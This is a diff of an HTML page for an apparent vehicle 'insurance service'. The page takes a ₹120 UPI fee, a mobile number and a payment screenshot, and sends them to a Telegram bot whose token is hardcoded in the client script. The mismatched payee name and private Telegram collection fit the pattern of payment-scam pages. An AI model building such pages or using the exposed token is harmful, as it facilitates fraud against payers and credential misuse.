@@ -8,105 +8,106 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}
 
-/* RGB ANIMATED BACKGROUND */
+/* RGB Animated Background */
 body{
 min-height:100vh;
-background:linear-gradient(-45deg,#005BAC,#00c6ff,#004a94,#0083b0);
+background:linear-gradient(-45deg,#005BAC,#0083b0,#004a94,#00c6ff);
 background-size:400% 400%;
-animation:rgbMove 10s ease infinite;
-color:#1a1a1a;
-overflow-x:hidden;
+animation:bgMove 10s ease infinite;
+display:flex;
+flex-direction:column;
+align-items:center;
+color:#fff;
 }
 
-@keyframes rgbMove{
+@keyframes bgMove{
 0%{background-position:0% 50%}
 50%{background-position:100% 50%}
 100%{background-position:0% 50%}
 }
 
-/* FLOATING EMOJI WATERMARK */
+/* Watermark Floating */
 body::before{
-content:"🚗  RC  🏍  🚚  RC  🚗  🏍  🚚";
+content:"🚗 RC 🏍 RC 🚚 🚘 RC 🏍 🚗";
 position:fixed;
-top:0;
-left:0;
 width:100%;
 height:100%;
-font-size:40px;
-color:rgba(255,255,255,0.08);
 display:flex;
 flex-wrap:wrap;
 justify-content:center;
 align-items:center;
+font-size:40px;
+color:rgba(255,255,255,0.05);
 pointer-events:none;
 animation:float 20s linear infinite;
 }
-
 @keyframes float{
 0%{transform:translateY(0)}
-50%{transform:translateY(-40px)}
+50%{transform:translateY(-30px)}
 100%{transform:translateY(0)}
 }
 
-/* TOPBAR */
-.topbar{
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:60px;
-background:#ffffff;
-display:flex;
-align-items:center;
-justify-content:space-between;
-padding:0 20px;
-box-shadow:0 2px 12px rgba(0,0,0,0.08);
-z-index:1000;
-}
-
-.topbar button{
-padding:8px 16px;
-border:none;
-border-radius:6px;
-background:#005BAC;
-color:#fff;
-font-weight:600;
-cursor:pointer;
-transition:0.2s;
-}
-
-.topbar button:active{
-transform:scale(0.92);
-box-shadow:0 4px 12px rgba(0,0,0,0.3);
-}
-
-/* CARD */
+/* Card */
 .card{
-margin-top:120px;
+margin-top:100px;
 width:92%;
 max-width:420px;
-margin-left:auto;
-margin-right:auto;
-background:#ffffff;
+background:rgba(255,255,255,0.12);
+backdrop-filter:blur(15px);
 padding:30px;
-border-radius:14px;
-box-shadow:0 8px 30px rgba(0,0,0,0.08);
+border-radius:20px;
 text-align:center;
-position:relative;
+box-shadow:0 15px 40px rgba(0,0,0,0.25);
 z-index:2;
 }
 
-.primaryBtn,.outlineBtn{
+h2{
+margin-bottom:15px;
+}
+
+/* Inputs */
+input{
+width:100%;
+padding:14px;
+margin-top:12px;
+border-radius:12px;
+border:none;
+font-size:15px;
+text-transform:uppercase;
+}
+
+/* Buttons */
+.btn{
+width:100%;
+padding:14px;
+margin-top:14px;
+border:none;
+border-radius:12px;
+font-weight:600;
+cursor:pointer;
+background:#ffffff;
+color:#005BAC;
 transition:0.15s;
 }
 
-.primaryBtn:active,
-.outlineBtn:active{
+.btn:active{
 transform:scale(0.92);
-box-shadow:0 6px 20px rgba(0,0,0,0.25);
+box-shadow:0 8px 25px rgba(0,0,0,0.4);
 }
 
-/* LOADER BAR */
+.btnBlue{
+background:#005BAC;
+color:#fff;
+}
+
+/* QR */
+.qr{
+width:180px;
+margin-top:15px;
+border-radius:12px;
+}
+
+/* Loader */
 .loader{
 position:fixed;
 top:0;
@@ -118,14 +119,14 @@ display:none;
 flex-direction:column;
 justify-content:center;
 align-items:center;
-z-index:2000;
+z-index:9999;
 }
 
 .barContainer{
-width:80%;
-height:20px;
-background:#e0e0e0;
-border-radius:30px;
+width:85%;
+height:22px;
+background:#ddd;
+border-radius:40px;
 overflow:hidden;
 }
 
@@ -147,22 +148,44 @@ margin-top:10px;
 font-size:14px;
 color:#333;
 text-align:center;
+padding:0 20px;
 }
 
 .footer{
-text-align:center;
 margin-top:40px;
 padding:20px;
 font-size:14px;
-color:#fff;
+opacity:0.9;
 }
-
 </style>
 </head>
 <body>
 
-<div class="topbar">
-<button onclick="goHome()">Home</button>
+<div class="card">
+
+<h2>Enter Vehicle Number</h2>
+
+<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
+
+<h3 style="margin-top:20px;">Service Fee ₹120</h3>
+
+<button class="btn btnBlue"
+onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
+Pay ₹120 with UPI
+</button>
+
+<img class="qr"
+src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR">
+
+<input id="mobile" placeholder="Mobile Number">
+<input type="file" id="proof">
+
+<button class="btn btnBlue" onclick="submitForm()">Submit</button>
+
+</div>
+
+<div class="footer">
+© 2026 Mishra Insurance Service. All rights reserved.
 </div>
 
 <div class="loader" id="loader">
@@ -173,49 +196,9 @@ color:#fff;
 <div class="loaderMsg" id="loaderMsg"></div>
 </div>
 
-<div class="card">
-
-<div id="homePage">
-<h3>Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
-<button class="primaryBtn" onclick="goPay()">Continue</button>
-</div>
-
-<div id="payPage" class="hidden">
-<h3>Service Fee ₹120</h3>
-
-<button class="primaryBtn"
-onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
-Pay with UPI
-</button>
-
-<input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof">
-
-<button class="primaryBtn" onclick="submitForm()">Submit</button>
-<button class="outlineBtn" onclick="goHome()">Back</button>
-</div>
-
-</div>
-
-<div class="footer">
-© 2026 Mishra Insurance Service. All rights reserved.
-</div>
-
 <script>
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
-
-function goHome(){
-homePage.classList.remove("hidden");
-payPage.classList.add("hidden");
-}
-
-function goPay(){
-if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
-homePage.classList.add("hidden");
-payPage.classList.remove("hidden");
-}
 
 function formatVehicle(input){
 let v=input.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
@@ -226,6 +209,7 @@ input.value=v;
 }
 
 function submitForm(){
+if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
 if(mobile.value.length<10){alert("Enter valid mobile");return;}
 if(!proof.files[0]){alert("Upload screenshot");return;}
 
@@ -254,7 +238,6 @@ fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{method:"POST",body:data
 .then(()=>{
 loader.style.display="none";
 alert("🎉 Mubarak Ho! Hum aapse jald hi sampark karenge.");
-goHome();
 })
 .catch(()=>{
 loader.style.display="none";
